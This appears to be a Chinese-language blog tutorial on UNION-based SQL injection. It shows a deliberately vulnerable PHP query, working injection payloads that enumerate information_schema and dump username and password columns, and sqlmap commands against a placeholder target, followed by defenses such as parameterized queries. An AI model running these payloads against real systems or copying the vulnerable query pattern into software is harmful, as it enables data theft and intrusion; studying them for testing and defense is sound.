---
title: SQL 注入基础：联合查询注入
date: 2024-08-31 08:57:07
tags:
  - Web安全
  - 渗透测试
description: SQL 注入基础：联合查询注入——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
---

## 什么是 SQL 注入

SQL 注入（SQL Injection）是指攻击者将恶意的 SQL 语句拼接到后端数据库查询中，从而改变原有查询逻辑。根源是用户输入直接拼接到 SQL 语句中执行，没有做参数化处理。

最简单的例子——后端代码长这样：

```php
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id = $id";
mysql_query($sql);
```

正常用户访问 `?id=1`，SQL 为 `SELECT * FROM news WHERE id = 1`。攻击者访问 `?id=1 OR 1=1`，SQL 变成 `SELECT * FROM news WHERE id = 1 OR 1=1`——全表数据被返回。

---

## 联合查询注入原理

利用 `UNION SELECT` 将攻击者的查询拼接到原查询后返回。前提是页面有回显位——查询结果会直接显示在页面上。

```mermaid
flowchart LR
    A[发现注入点] --> B[ORDER BY 猜列数]
    B --> C[UNION SELECT 找回显位]
    C --> D[查库名]
    D --> E["information_schema 枚举表/字段"]
    E --> F[Dump 数据]
```

---

## 第一步：判断注入类型

| Payload | 说明 |
|---------|------|
| `'` | 单引号闭合测试 |
| `"` | 双引号闭合测试 |
| `')` | 括号+单引号 |
| `' and 1=1 -- -` | 永真条件 |
| `' and 1=2 -- -` | 永假条件（对比页面差异） |

数字型注入用数学运算：`?id=2-1` 返回和 `?id=1` 一样 = 注入点。

---

## 第二步：ORDER BY 猜列数

```sql
?id=1' ORDER BY 1 -- -   -- 正常
?id=1' ORDER BY 2 -- -   -- 正常
?id=1' ORDER BY 3 -- -   -- 正常
?id=1' ORDER BY 4 -- -   -- 报错 → 说明表有 3 列
```

---

## 第三步：UNION SELECT 找回显位

```sql
?id=-1' UNION SELECT 1,2,3 -- -
```

页面显示的数字就是回显位。`?id=-1` 让前面的 SELECT 查不到东西，页面就只剩下你的 UNION 结果。

---

## 第四、五步：information_schema 全枚举

```sql
-- 查库名
?id=-1' UNION SELECT 1,database(),3 -- -

-- 查所有表
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='库名' -- -

-- 查字段
?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -

-- Dump 数据
?id=-1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -
```

| information_schema 表 | 用途 |
|----------------------|------|
| `schemata` | 所有数据库名 |
| `tables` | 所有库的所有表 |
| `columns` | 所有表的所有字段 |

---

## SQLMap 入门

```bash
# 基础探测
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# POST 注入（Burp 抓包 → 右键 Copy to file → request.txt）
sqlmap -r request.txt --dbs

# 枚举
sqlmap -u "..." -D dbname --tables
sqlmap -u "..." -D dbname -T users --columns
sqlmap -u "..." -D dbname -T users -C username,password --dump

# 生产环境——必须加延迟
sqlmap -u "..." --dbs --delay=2 --threads=1 --risk=1 --batch
```

---

## 实战踩坑

1. **ORDER BY 不报错** → 可能关了报错回显，试试 `AND 1=2` 对比页面变化，无变化→盲注场景
2. **group_concat 截断** → 默认 1024 字节限制，数据多时用 `LIMIT 0,1` 逐条取
3. **SQLMap 打挂了** → 没加 `--delay`，把对面慢查询打满
4. **表名含特殊字符** → `--batch` 用默认字典会跳过，重要目标别开 `--batch`

---

## 防御方案

1. **参数化查询**：`$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$_GET['id']]);`
2. **ORM 框架**：用 `#{}` 而非 `${}`
3. **最小权限**：数据库账号不给 root/sa
4. **关闭报错**：生产环境 `display_errors=Off`

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
